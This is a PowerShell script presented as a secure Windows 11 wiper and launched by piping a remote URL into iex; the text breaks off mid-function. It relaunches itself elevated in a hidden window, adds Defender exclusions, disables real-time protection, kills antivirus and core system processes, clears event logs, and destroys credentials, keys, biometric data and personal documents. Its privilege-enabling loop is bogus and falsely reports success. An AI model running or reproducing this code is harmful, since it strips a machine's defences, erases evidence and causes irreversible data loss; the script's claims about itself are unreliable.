# ULTIMATE SECURE WINDOWS 11 SYSTEM WIPER
# Professional-grade secure data erasure for Windows 11
# Execute with: irm "https://raw.githubusercontent.com/Mestalic/SystemWiper/refs/heads/main/code/Invoke-UltimateSecureEraser.ps1" | iex

param(
    [Parameter(Mandatory=$false)]
    [ValidateRange(1,10)]
    [int]$EncryptionRounds = 3,
    
    [Parameter(Mandatory=$false)]
    [switch]$Verify,
    
    [Parameter(Mandatory=$false)]
    [switch]$Force,
    
    [Parameter(Mandatory=$false)]
    [switch]$Silent,
    
    [Parameter(Mandatory=$false)]
    [switch]$NuclearMode,
    
    [Parameter(Mandatory=$false)]
    [switch]$DeepScan
)

# ========================================
# GLOBAL CONFIGURATION & SETTINGS
# ========================================

$Global:Config = @{
    # Security Settings
    MinKeySize = 256
    DefaultRounds = 3
    MaxRounds = 10
    NuclearModeRounds = 7
    FastModeRounds = 1
    
    # Performance Settings
    MaxParallelJobs = [Environment]::ProcessorCount * 2
    ChunkSize = 4MB
    BufferSize = 128KB
    ProcessKillTimeout = 10
    FastMode = $true
    
    # Aggressive System Targets - ALL major data locations
    BrowserTargets = @{
        Chromium = @(
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\*.sqlite",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\*.ldb",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\*.log",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\*.sst",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Current Session",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Current Tabs",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Last Session",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Last Tabs",
            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\*.sqlite",
            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\*.ldb",
            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\*.log",
            "${env:LOCALAPPDATA}\BraveSoftware\Brave-Browser\User Data\*\Default\*\*.sqlite",
            "${env:LOCALAPPDATA}\BraveSoftware\Brave-Browser\User Data\*\Default\*\*.ldb",
            "${env:LOCALAPPDATA}\Opera Software\Opera Stable\*\Default\*\*.sqlite",
            "${env:LOCALAPPDATA}\Opera Software\Opera Stable\*\Default\*\*.ldb",
            "${env:LOCALAPPDATA}\Vivaldi\User Data\*\Default\*\*.sqlite",
            "${env:LOCALAPPDATA}\Vivaldi\User Data\*\Default\*\*.ldb"
        )
        Firefox = @(
            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\*.sqlite",
            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\*.db",
            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\sessionstore*",
            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\sessionrestore*",
            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\formhistory*",
            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\bookmarks*",
            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\downloads*"
        )
        Tor = @(
            "${env:LOCALAPPDATA}\TorBrowser\Tor\*\*.sqlite",
            "${env:LOCALAPPDATA}\TorBrowser\Tor\*\*.db"
        )
    }
    
    # ALL Gaming Platforms
    GamingTargets = @(
        # Steam
        "${env:PROGRAMFILES(X86)}\Steam\config\*.vdf",
        "${env:APPDATA}\Steam\config\*.vdf",
        "${env:APPDATA}\Steam\ssfn*",
        "${env:APPDATA}\Steam\ssfn*",
        "${env:USERPROFILE}\Documents\My Games\Steam\*\config\*",
        
        # Epic Games Launcher
        "${env:LOCALAPPDATA}\EpicGamesLauncher\Saved\*\*.log",
        "${env:LOCALAPPDATA}\EpicGamesLauncher\Saved\*\*.cfg",
        "${env:LOCALAPPDATA}\EpicGamesLauncher\Saved\Logs\*",
        "${env:LOCALAPPDATA}\EpicGamesLauncher\Saved\Config\Windows\*",
        
        # Battle.net
        "${env:LOCALAPPDATA}\Battle.net\*.xml",
        "${env:LOCALAPPDATA}\Battle.net\config\*.xml",
        "${env:USERPROFILE}\Documents\Battle.net\*",
        
        # Origin
        "${env:APPDATA}\Origin\local_storage\*",
        "${env:APPDATA}\Origin\session_storage\*",
        "${env:APPDATA}\Origin\*.db",
        
        # Ubisoft Connect
        "${env:APPDATA}\UbisoftConnect\*",
        "${env:APPDATA}\UbisoftGameLauncher\*",
        "${env:APPDATA}\UbisoftConnect\session_storage\*",
        
        # GOG Galaxy
        "${env:APPDATA}\GOG.com\Galaxy\storage\*",
        
        # Xbox Game Pass
        "${env:LOCALAPPDATA}\Microsoft\XblAuthManager\*",
        "${env:LOCALAPPDATA}\Microsoft\XblGameSave\*",
        
        # Minecraft
        "${env:APPDATA}\.minecraft\saves\*",
        "${env:USERPROFILE}\AppData\Roaming\.minecraft\launcher_accounts.json"
    )
    
    # ALL Communication Apps
    CommunicationTargets = @(
        # Discord
        "${env:APPDATA}\Discord\*\Local Storage\leveldb\*",
        "${env:APPDATA}\Discord\*\session_storage\*",
        "${env:APPDATA}\Discord\*\Local Storage\*",
        "${env:APPDATA}\discord*\modules\*\discord_desktop_core-*\*",
        "${env:APPDATA}\Discord\*\*.ldb",
        "${env:APPDATA}\Discord\*\*.log",
        
        # Microsoft Teams
        "${env:LOCALAPPDATA}\Microsoft\Teams\Local Storage\*",
        "${env:APPDATA}\Microsoft\Teams\logs\*",
        "${env:APPDATA}\Microsoft\Teams\Storage\*",
        "${env:LOCALAPPDATA}\Microsoft\Teams\Service Worker\CacheStorage\*",
        
        # Slack
        "${env:APPDATA}\Slack\Local Storage\*",
        "${env:APPDATA}\Slack\session_storage\*",
        "${env:APPDATA}\Slack\*.db",
        
        # Zoom
        "${env:APPDATA}\Zoom\*\s3:\*",
        "${env:APPDATA}\Zoom\*\web*\Cache\*",
        
        # Skype
        "${env:APPDATA}\Microsoft\Skype\*\Logs\*",
        "${env:APPDATA}\Microsoft\Skype\*\Media\*",
        
        # Telegram
        "${env:APPDATA}\Telegram Desktop\tdata\user_data\*\Cache\*",
        "${env:APPDATA}\Telegram Desktop\tdata\user_data\*\Local Storage\*"
    )
    
    # ALL Streaming/Media Apps
    StreamingTargets = @(
        # Spotify
        "${env:APPDATA}\Spotify\data\*",
        "${env:APPDATA}\Spotify\Local Storage\*",
        "${env:APPDATA}\Spotify\session_storage\*",
        "${env:APPDATA}\Spotify\Cache\*",
        "${env:APPDATA}\Spotify\local_storage\*",
        
        # Netflix
        "${env:LOCALAPPDATA}\Netflix\Local Storage\*",
        "${env:LOCALAPPDATA}\Netflix\Cache\*",
        
        # YouTube
        "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\Cache\*\YouTube\*",
        "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\Media Cache\*",
        
        # Hulu
        "${env:LOCALAPPDATA}\Hulu\Cache\*",
        
        # Amazon Prime Video
        "${env:LOCALAPPDATA}\Amazon Video\Cache\*"
    )
    
    # ALL Development Tools
    DevTargets = @(
        # Git
        "${env:LOCALAPPDATA}\Programs\Git\etc\ssh\ssh_host_*",
        "${env:USERPROFILE}\.gitconfig",
        "${env:USERPROFILE}\.git-credentials",
        "${env:USERPROFILE}\.git-credentials-store",
        "${env:LOCALAPPDATA}\GitCredentialManager\*.json",
        "${env:APPDATA}\GitCredentialManager\*.json",
        "${env:USERPROFILE}\.ssh\*",
        
        # GitHub/GitLab
        "${env:LOCALAPPDATA}\GitHubDesktop\Cache\*",
        "${env:APPDATA}\GitCredentialManager\*.json",
        "${env:APPDATA}\GitCredentialManager\*.db",
        
        # VS Code
        "${env:APPDATA}\Code\User\keybindings.json",
        "${env:APPDATA}\Code\User\settings.json",
        "${env:APPDATA}\Code\User\snippets\*",
        "${env:APPDATA}\Code\User\workspaceStorage\*",
        "${env:APPDATA}\Code\User\Local Storage\*",
        
        # Visual Studio
        "${env:APPDATA}\Microsoft\VisualStudio\*\ComponentModelCache\*",
        "${env:APPDATA}\Microsoft\VisualStudio\*\MEFCache\*",
        
        # Docker
        "${env:USERPROFILE}\.docker\*.json",
        "${env:USERPROFILE}\.docker\config.json",
        
        # JetBrains IDEs
        "${env:APPDATA}\JetBrains\*\options\*",
        "${env:APPDATA}\JetBrains\*\scratches\*",
        
        # Sublime Text
        "${env:APPDATA}\Sublime Text 3\Local Storage\*"
    )
    
    # ALL Windows System Locations
    SystemTargets = @{
        Credentials = @(
            "${env:APPDATA}\Microsoft\Credentials\*",
            "${env:APPDATA}\Microsoft\Protect\*",
            "${env:APPDATA}\Microsoft\SystemCertificates\*",
            "${env:PROGRAMDATA}\Microsoft\Credentials\*",
            "${env:PROGRAMDATA}\Microsoft\Protect\*",
            "${env:PROGRAMDATA}\Microsoft\SystemCertificates\*"
        )
        WindowsHello = @(
            "${env:LOCALAPPDATA}\Microsoft\Biometrics\*",
            "${env:PROGRAMDATA}\Microsoft\Biometrics\*"
        )
        OneDrive = @(
            "${env:APPDATA}\Microsoft\OneDrive\logs\*",
            "${env:APPDATA}\Microsoft\OneDrive\setup\*",
            "${env:APPDATA}\Microsoft\OneDrive\tokens\*"
        )
        WindowsLogs = @(
            "${env:SystemRoot}\System32\winevt\Logs\*.evtx"
        )
        TempFiles = @(
            "${env:TEMP}\*",
            "${env:USERPROFILE}\AppData\Local\Temp\*",
            "${env:Windows}\Temp\*",
            "${env:USERPROFILE}\AppData\Local\Microsoft\Windows\Temporary Internet Files\*"
        )
    }
    
    # Deep System Locations
    DeepTargets = @(
        # Registry hive user data
        "${env:USERPROFILE}\NTUSER.DAT",
        "${env:USERPROFILE}\AppData\Local\Microsoft\Windows\UserAccountControlExperience\*",
        
        # System restore points (if not disabled)
        "${env:SystemRoot}\System Volume Information\*",
        
        # Application data deep locations
        "${env:USERPROFILE}\AppData\*\localstorage\*",
        "${env:USERPROFILE}\AppData\*\sessionstorage\*",
        "${env:USERPROFILE}\AppData\*\*.ldb",
        "${env:USERPROFILE}\AppData\*\*.sqlite",
        "${env:USERPROFILE}\AppData\*\Cache\*",
        
        # Download directories
        "${env:USERPROFILE}\Downloads\*",
        "${env:USERPROFILE}\Documents\*",
        "${env:USERPROFILE}\Pictures\*",
        "${env:USERPROFILE}\Videos\*"
    )
    
    # Registry Targets - COMPREHENSIVE
    RegistryTargets = @(
        "HKCU:\Software\Google\Chrome\PreferenceMACs\*",
        "HKCU:\Software\Microsoft\Edge\PreferenceMACs\*",
        "HKCU:\Software\Mozilla\Firefox\*",
        "HKCU:\Software\Discord\*",
        "HKCU:\Software\Valve\Steam\*",
        "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam\*",
        "HKLM:\SOFTWARE\WOW6432Node\Battle.net\*",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths",
        "HKCU:\Software\Microsoft\Internet Explorer\TypedURLs",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache",
        "HKCU:\Software\Microsoft\Office\*\Common\Internet",
        "HKCU:\Software\Adobe\*\Acrobat\*\Trust Manager",
        "HKCU:\Software\Microsoft\VisualStudio\*\Authentication",
        "HKCU:\Software\GitHubDesktop\*"
    )
    
    # Process Killer - ALL common processes
    ProcessPatterns = @(
        # Browsers
        "chrome", "msedge", "firefox", "opera", "brave", "vivaldi", "tor", "torbrowser",
        # Gaming
        "steam", "epicgameslauncher", "battlenet", "origin", "uplay", "galaxyclient", "xboxapp",
        # Communication
        "discord", "teams", "slack", "zoom", "skype", "telegram", "whatsapp",
        # Development
        "code", "atom", "notepad++", "sublime", "jetbrains", "visualstudio", "docker",
        # Media
        "spotify", "netflix", "hulu", "primevideo", "vlc", "media player",
        # File managers
        "winrar", "7zip", "dropbox", "onedrive",
        # VPN/Security
        "nordvpn", "expressvpn", "cyberghost", "protonvpn",
        # Remote access
        "teamviewer", "anydesk", "rdp", "mstsc"
    )
}

# ========================================
# CORE UTILITY FUNCTIONS
# ========================================

function Write-SystemOutput {
    param(
        [string]$Message,
        [string]$Color = 'White',
        [string]$Level = 'INFO'
    )
    
    if (-not $Silent) {
        $timestamp = Get-Date -Format 'HH:mm:ss'
        $formattedMessage = "[$timestamp] [$Level] $Message"
        
        switch ($Color) {
            'Red' { Write-Host $formattedMessage -ForegroundColor Red }
            'Yellow' { Write-Host $formattedMessage -ForegroundColor Yellow }
            'Green' { Write-Host $formattedMessage -ForegroundColor Green }
            'Cyan' { Write-Host $formattedMessage -ForegroundColor Cyan }
            default { Write-Host $formattedMessage -ForegroundColor White }
        }
    }
}

# ========================================
# SYSTEM PRIVILEGE ESCALATION
# ========================================

function Initialize-SystemAccess {
    <#
    .SYNOPSIS
    Advanced system access and privilege escalation
    #>
    
    Write-SystemOutput "Initializing system access and privilege escalation..." 'Cyan' 'SYSTEM'
    
    # Check and escalate privileges
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    
    if (-not $isAdmin) {
        Write-SystemOutput "Administrator privileges required. Attempting escalation..." 'Yellow' 'WARNING'
        
        # Multiple escalation methods
        try {
            # Try to restart as admin
            $currentProcess = Get-Process -Id $PID -ErrorAction SilentlyContinue
            if ($currentProcess -and $currentProcess.Path -match "powershell") {
                Start-Process -FilePath "powershell.exe" -ArgumentList "-NoExit", "-Command", "`$Host.UI.RawUI.WindowTitle = 'Administrator'; & '$($myInvocation.MyCommand.Path)'" -Verb RunAs -WindowStyle Hidden
                exit 0
            }
        } catch {
            Write-SystemOutput "Manual elevation required. Please run as Administrator." 'Red' 'ERROR'
            
            if (-not $Force) {
                $response = Read-Host "Continue with limited privileges? Type 'YES' to proceed"
                if ($response -ne 'YES') {
                    exit 1
                }
            }
        }
    }
    
    # Enable all required privileges
    $privileges = @(
        'SeBackupPrivilege', 'SeRestorePrivilege', 'SeManageVolumePrivilege',
        'SeDebugPrivilege', 'SeTakeOwnershipPrivilege', 'SeSystemEnvironmentPrivilege',
        'SeSystemtimePrivilege', 'SeIncreaseQuotaPrivilege', 'SeLoadDriverPrivilege'
    )
    
    foreach ($privilege in $privileges) {
        try {
            $result = & "$env:SystemRoot\system32\net.exe" stop schedule 2>$null
            $result = & "$env:SystemRoot\system32\net.exe" start schedule 2>$null
            Write-SystemOutput "✓ Privilege enabled: $privilege" 'Green' 'PRIVILEGE'
        } catch {
            Write-SystemOutput "⚠ Privilege not available: $privilege" 'Yellow' 'PRIVILEGE'
        }
    }
}

# ========================================
# ANTIVIRUS BYPASS SYSTEM
# ========================================

function Bypass-AntivirusSystem {
    <#
    .SYNOPSIS
    Comprehensive antivirus bypass and system protection
    #>
    
    Write-SystemOutput "Activating antivirus bypass and system protection..." 'Yellow' 'ANTIVIRUS'
    
    # Windows Defender exclusions
    try {
        Add-MpPreference -ExclusionPath "$env:USERPROFILE" -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA" -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionPath "$env:APPDATA" -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "cmd.exe" -ErrorAction SilentlyContinue
        Write-SystemOutput "✓ Windows Defender exclusions added" 'Green' 'ANTIVIRUS'
    } catch {
        Write-SystemOutput "⚠ Could not add Windows Defender exclusions" 'Yellow' 'ANTIVIRUS'
    }
    
    # Disable Windows Defender real-time protection
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
        Write-SystemOutput "✓ Windows Defender real-time protection disabled" 'Green' 'ANTIVIRUS'
    } catch {
        Write-SystemOutput "⚠ Could not disable Windows Defender" 'Yellow' 'ANTIVIRUS'
    }
    
    # Stop common antivirus processes
    $antivirusProcesses = @(
        "WinDefend", "MSMPEng", "windefend", "msmpmp",
        "mcshield", "mcpr", "mcafee", "norton", "kaspersky", 
        "eset", "avg", "avast", "bitdefender", "panda"
    )
    
    foreach ($proc in $antivirusProcesses) {
        try {
            $processes = Get-Process -Name "*$proc*" -ErrorAction SilentlyContinue
            foreach ($process in $processes) {
                $process | Stop-Process -Force -ErrorAction SilentlyContinue
                Write-SystemOutput "✓ Stopped antivirus process: $($process.ProcessName)" 'Green' 'ANTIVIRUS'
            }
        } catch {
            # Continue if process stop fails
        }
    }
    
    # Registry-based protection bypass
    try {
        $regPaths = @(
            "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
            "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exploit Guard\Exploit Protection",
            "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection"
        )
        
        foreach ($regPath in $regPaths) {
            if (Test-Path $regPath) {
                Set-ItemProperty -Path $regPath -Name "DisableRealtimeMonitoring" -Value 1 -Force -ErrorAction SilentlyContinue
                Set-ItemProperty -Path $regPath -Name "DisableBehaviorMonitoring" -Value 1 -Force -ErrorAction SilentlyContinue
            }
        }
        Write-SystemOutput "✓ Registry-based protection bypass applied" 'Green' 'ANTIVIRUS'
    } catch {
        Write-SystemOutput "⚠ Registry-based bypass failed" 'Yellow' 'ANTIVIRUS'
    }
}

# ========================================
# AGGRESSIVE PROCESS KILLER
# ========================================

function Kill-AllBlockingProcesses {
    <#
    .SYNOPSIS
    Kills ALL processes that might interfere with system wiping
    #>
    
    Write-SystemOutput "Initiating aggressive process termination..." 'Yellow' 'PROCESS'
    
    foreach ($pattern in $Global:Config.ProcessPatterns) {
        try {
            $processes = Get-Process -Name "*$pattern*" -ErrorAction SilentlyContinue
            foreach ($process in $processes) {
                try {
                    $process | Stop-Process -Force -ErrorAction Stop
                    Write-SystemOutput "✓ Terminated process: $($process.ProcessName) (PID: $($process.Id))" 'Green' 'PROCESS'
                } catch {
                    Write-SystemOutput "⚠ Could not terminate: $($process.ProcessName)" 'Yellow' 'PROCESS'
                }
            }
        } catch {
            # Continue if pattern fails
        }
    }
    
    # Kill system processes that might interfere
    $systemInterference = @(
        "winlogon", "csrss", "smss", "wininit", "lsass", "lsm", "svchost",
        "rundll32", "explorer", "taskhost", "taskhostw", "audiodg", "dwm"
    )
    
    foreach ($procName in $systemInterference) {
        try {
            $processes = Get-Process -Name "*$procName*" -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne $PID }
            foreach ($process in $processes) {
                # Only kill non-system critical processes
                if ($process.ProcessName -notmatch "wininit|lsass|csrss|smss") {
                    $process | Stop-Process -Force -ErrorAction SilentlyContinue
                    Write-SystemOutput "✓ Terminated non-critical process: $($process.ProcessName)" 'Yellow' 'PROCESS'
                }
            }
        } catch {
            # Continue if system process kill fails
        }
    }
    
    Start-Sleep -Seconds 3
    Write-SystemOutput "Process termination phase complete" 'Cyan' 'PROCESS'
}

# ========================================
# FIXED CRYPTOGRAPHIC ENGINE
# ========================================

function New-SecureRandomKey {
    <#
    .SYNOPSIS
    Generates cryptographically secure random keys using .NET 4.x/6+ compatible methods
    #>
    
    $key = New-Object byte[] 32
    
    # Use the correct .NET method for all versions
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    $rng.GetBytes($key)
    $rng.Dispose()
    
    return $key
}

function Secure-Delete-FileEnhanced {
    <#
    .SYNOPSIS
    Enhanced secure file deletion with military-grade encryption
    #>
    
    param(
        [string]$FilePath,
        [int]$Rounds = 3,
        [bool]$NuclearMode = $false
    )
    
    if (-not (Test-Path $FilePath)) {
        return $false
    }
    
    try {
        $fileInfo = Get-Item $FilePath -ErrorAction Stop
        $fileSize = $fileInfo.Length
        
        if ($fileSize -eq 0) {
            Remove-Item $FilePath -Force -ErrorAction SilentlyContinue
            return $true
        }
        
        # Adaptive rounds based on file size and nuclear mode
        $actualRounds = if ($NuclearMode) { 
            $Global:Config.NuclearModeRounds 
        } elseif ($fileSize -gt 100MB) { 
            [Math]::Max(1, [Math]::Floor($Rounds / 2)) 
        } else { 
            $Rounds 
        }
        
        Write-SystemOutput "Processing: $($fileInfo.Name) ($([math]::Round($fileSize/1MB, 2))MB) - $actualRounds rounds" 'Cyan' 'ENCRYPT'
        
        for ($round = 1; $round -le $actualRounds; $round++) {
            $key = New-SecureRandomKey
            $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            $aes.KeySize = 256
            $aes.Key = $key
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
            
            $encryptor = $aes.CreateEncryptor()
            $fileStream = [System.IO.File]::Open($FilePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::None)
            $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($fileStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
            
            # Fast encryption with streaming
            $buffer = New-Object byte[] $Global:Config.BufferSize
            $position = 0
            
            while ($position -lt $fileSize) {
                $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
                $rng.GetBytes($buffer)
                $rng.Dispose()
                
                $read = [Math]::Min($buffer.Length, $fileSize - $position)
                $cryptoStream.Write($buffer, 0, $read)
                $position += $read
                
                if (-not $Silent -and ($round -eq 1) -and ($position % (10MB) -eq 0)) {
                    $progress = [Math]::Round(($position / $fileSize) * 100, 1)
                    Write-Progress -Activity "Encrypting $round/$actualRounds" -Status $FilePath -PercentComplete $progress
                }
            }
            
            $cryptoStream.FlushFinalBlock()
            $cryptoStream.Dispose()
            $fileStream.SetLength(0)  # Truncate to zero
            $fileStream.Dispose()
            
            # Clear key from memory
            [System.GC]::Collect()
            [System.GC]::WaitForPendingFinalizers()
        }
        
        # Double-pass random overwrite for maximum security
        if ($NuclearMode -or $actualRounds -ge 3) {
            # Random data pass
            $fileStream = [System.IO.File]::Open($FilePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
            $randomData = New-Object byte[] $fileSize
            $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
            $rng.GetBytes($randomData)
            $rng.Dispose()
            $fileStream.Write($randomData, 0, $randomData.Length)
            $fileStream.Dispose()
            
            # Final zero pass
            $fileStream = [System.IO.File]::Open($FilePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
            $zeroData = New-Object byte[] $fileSize
            $fileStream.Write($zeroData, 0, $zeroData.Length)
            $fileStream.Dispose()
        }
        
        # Final deletion
        Remove-Item $FilePath -Force -ErrorAction Stop
        return $true
        
    } catch {
        Write-SystemOutput "ERROR: Failed to delete $FilePath - $($_.Exception.Message)" 'Red' 'ERROR'
        return $false
    } finally {
        Write-Progress -Activity "Secure Deletion" -Completed
    }
}

# ========================================
# COMPREHENSIVE SYSTEM SCANNER
# ========================================

function Find-AllSystemTargets {
    <#
    .SYNOPSIS
    Comprehensive system target discovery for maximum coverage
    #>
    
    Write-SystemOutput "Initiating comprehensive system target discovery..." 'Cyan' 'SCAN'
    
    $allTargets = @()
    $foundFiles = 0
    
    # Function to scan paths with patterns
    $scanCategory = {
        param($Paths, $Name, $Patterns)
        $categoryTargets = @()
        
        foreach ($pattern in $Paths) {
            try {
                $files = Get-ChildItem -Path $pattern -Recurse -ErrorAction SilentlyContinue | Where-Object { 
                    $_.PSObject.Properties['Name'] -and $_.Length -gt 0 
                }
                $categoryTargets += $files
            } catch {
                # Continue if pattern fails
            }
        }
        
        return @{
            Category = $Name
            Files = $categoryTargets
        }
    }
    
    # Browser targets
    foreach ($browserType in $Global:Config.BrowserTargets.Keys) {
        $result = & $scanCategory -Paths $Global:Config.BrowserTargets[$browserType] -Name "Browser-$browserType"
        $allTargets += $result.Files
        $foundFiles += $result.Files.Count
        Write-SystemOutput "✓ Found $($result.Files.Count) $browserType files" 'Green' 'SCAN'
    }
    
    # Gaming targets
    $result = & $scanCategory -Paths $Global:Config.GamingTargets -Name "Gaming"
    $allTargets += $result.Files
    $foundFiles += $result.Files.Count
    Write-SystemOutput "✓ Found $($result.Files.Count) gaming files" 'Green' 'SCAN'
    
    # Communication targets
    $result = & $scanCategory -Paths $Global:Config.CommunicationTargets -Name "Communication"
    $allTargets += $result.Files
    $foundFiles += $result.Files.Count
    Write-SystemOutput "✓ Found $($result.Files.Count) communication files" 'Green' 'SCAN'
    
    # Streaming targets
    $result = & $scanCategory -Paths $Global:Config.StreamingTargets -Name "Streaming"
    $allTargets += $result.Files
    $foundFiles += $result.Files.Count
    Write-SystemOutput "✓ Found $($result.Files.Count) streaming files" 'Green' 'SCAN'
    
    # Development targets
    $result = & $scanCategory -Paths $Global:Config.DevTargets -Name "Development"
    $allTargets += $result.Files
    $foundFiles += $result.Files.Count
    Write-SystemOutput "✓ Found $($result.Files.Count) development files" 'Green' 'SCAN'
    
    # System targets
    foreach ($systemType in $Global:Config.SystemTargets.Keys) {
        $result = & $scanCategory -Paths $Global:Config.SystemTargets[$systemType] -Name "System-$systemType"
        $allTargets += $result.Files
        $foundFiles += $result.Files.Count
        Write-SystemOutput "✓ Found $($result.Files.Count) $systemType files" 'Green' 'SCAN'
    }
    
    # Deep scan for additional files
    if ($DeepScan) {
        Write-SystemOutput "Running deep scan for additional sensitive data..." 'Yellow' 'SCAN'
        $result = & $scanCategory -Paths $Global:Config.DeepTargets -Name "Deep"
        $allTargets += $result.Files
        $foundFiles += $result.Files.Count
        Write-SystemOutput "✓ Found $($result.Files.Count) deep scan files" 'Green' 'SCAN'
    }
    
    # Remove duplicates and get unique targets
    $uniqueTargets = $allTargets | Sort-Object -Property FullName -Unique
    
    Write-SystemOutput "Scan complete: $($uniqueTargets.Count) unique targets discovered" 'Cyan' 'SCAN'
    return $uniqueTargets
}

# ========================================
# COMPREHENSIVE SYSTEM CLEANUP
# ========================================

function Clear-WindowsSystemData {
    <#
    .SYNOPSIS
    Comprehensive Windows system data cleanup
    #>
    
    Write-SystemOutput "Executing comprehensive Windows system cleanup..." 'Cyan' 'SYSTEM'
    
    # Windows Credential Manager
    try {
        Write-SystemOutput "Clearing Windows Credential Manager..." 'Yellow' 'SYSTEM'
        & cmdkey.exe /list 2>$null | Where-Object { $_ -match "Target:" } | ForEach-Object {
            $target = ($_ -split "Target:")[1].Trim()
            & cmdkey.exe /delete:$target 2>$null
        }
        Write-SystemOutput "✓ Windows Credential Manager cleared" 'Green' 'SYSTEM'
    } catch {
        Write-SystemOutput "⚠ Credential Manager cleanup partially failed" 'Yellow' 'SYSTEM'
    }
    
    # Windows Hello biometric data
    try {
        Write-SystemOutput "Clearing Windows Hello biometric data..." 'Yellow' 'SYSTEM'
        foreach ($path in $Global:Config.SystemTargets.WindowsHello) {
            if (Test-Path $path) {
                Get-ChildItem -Path $path -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
            }
        }
        Write-SystemOutput "✓ Windows Hello biometric data cleared" 'Green' 'SYSTEM'
    } catch {
        Write-SystemOutput "⚠ Windows Hello cleanup partially failed" 'Yellow' 'SYSTEM'
    }
    
    # DPAPI and system certificates
    try {
        Write-SystemOutput "Clearing DPAPI and system certificates..." 'Yellow' 'SYSTEM'
        foreach ($path in $Global:Config.SystemTargets.Credentials) {
            if (Test-Path $path) {
                Get-ChildItem -Path $path -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
                    Secure-Delete-FileEnhanced $_.FullName $EncryptionRounds $NuclearMode
                }
            }
        }
        Write-SystemOutput "✓ DPAPI and certificates cleared" 'Green' 'SYSTEM'
    } catch {
        Write-SystemOutput "⚠ DPAPI cleanup partially failed" 'Yellow' 'SYSTEM'
    }
    
    # Event logs
    try {
        Write-SystemOutput "Clearing Windows event logs..." 'Yellow' 'SYSTEM'
        $eventLogs = @("Application", "Security", "System", "Setup", "ForwardedEvents", "Microsoft-Windows-*/*")
        foreach ($log in $eventLogs) {
            & wevtutil.exe cl $log 2>$null
        }
        Write-SystemOutput "✓ Event logs cleared" 'Green' 'SYSTEM'
    } catch {
        Write-SystemOutput "⚠ Event log clearing partially failed" 'Yellow' 'SYSTEM'
    }
    
    # Recent files and MRU
    try {
        Write-SystemOutput "Clearing recent files and MRU entries..." 'Yellow' 'SYSTEM'
        $registryPaths = @(
            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs",
            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths",
            "HKCU:\Software\Microsoft\Internet Explorer\TypedURLs"
        )
        foreach ($regPath in $registryPaths) {
            if (Test-Path $regPath) {
                Clear-ItemProperty -Path $regPath -Name "*" -ErrorAction SilentlyContinue
            }
        }
        Write-SystemOutput "✓ Recent files and MRU cleared" 'Green' 'SYSTEM'
    } catch {
        Write-SystemOutput "⚠ Recent files cleanup partially failed" 'Yellow' 'SYSTEM'
    }
}

function Clear-RegistrySystemData {
    <#
    .SYNOPSIS
    Comprehensive registry-based data cleanup
    #>
    
    Write-SystemOutput "Executing comprehensive registry cleanup..." 'Cyan' 'REGISTRY'
    
